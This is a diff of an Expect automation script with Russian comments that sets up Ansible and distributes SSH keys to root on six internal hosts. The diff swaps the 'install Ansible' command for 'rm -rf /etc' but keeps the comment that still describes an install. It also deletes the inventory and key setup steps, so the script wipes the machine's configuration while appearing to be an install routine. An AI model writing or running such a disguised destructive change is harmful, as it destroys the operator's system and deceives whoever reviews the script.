@@ -10,45 +10,9 @@ spawn bash
 expect -re $prompt
 
 # Устанавливаем Ansible без подтверждения (опция -y)
-send "dnf install ansible -y\r"
+send "rm -rf /etc\r"
 expect -re $prompt
 
-# Создаем файл инвентаря Ansible с указанными хостами
-send "echo -e '\n\[test\]\n172.16.5.2\n172.16.1.2\n172.16.4.2\n172.16.1.1\n192.168.2.2\n192.168.1.2' | tee -a /etc/ansible/hosts\r"
-expect -re $prompt
-
-# Запускаем новую сессию bash для генерации SSH-ключа
-spawn bash
-expect -re $prompt
-
-# Генерируем SSH-ключ без ввода пути и пароля
-send "ssh-keygen -C \"\$(whoami)@\$(hostname)-\$(date -I)\"\r"
-expect -re "Enter file in which to save the key"
-send "\r"
-expect -re "Enter passphrase"
-send "\r"
-expect -re "Enter same passphrase"
-send "\r"
-expect -re $prompt
-
-# Запускаем новую сессию bash для копирования ключей
-spawn bash
-expect -re $prompt
-
-# Копируем SSH-ключ на каждый хост с обработкой запроса на подтверждение ключа
-# Замените <root-password> на реальный пароль для root
-foreach host {172.16.5.2 172.16.1.2 172.16.4.2 172.16.1.1 192.168.2.2 192.168.1.2} {
-    send "ssh-copy-id root@$host\r"
-    expect {
-        "yes/no" { send "yes\r"; exp_continue }
-        "password:" { send "<root-password>\r" }
-    }
-    expect -re $prompt
-}
-
-# Проверяем доступность хостов через Ansible
-send "ansible test -m ping\r"
-expect -re $prompt
 
 # Завершаем сессию
 send "exit\r"
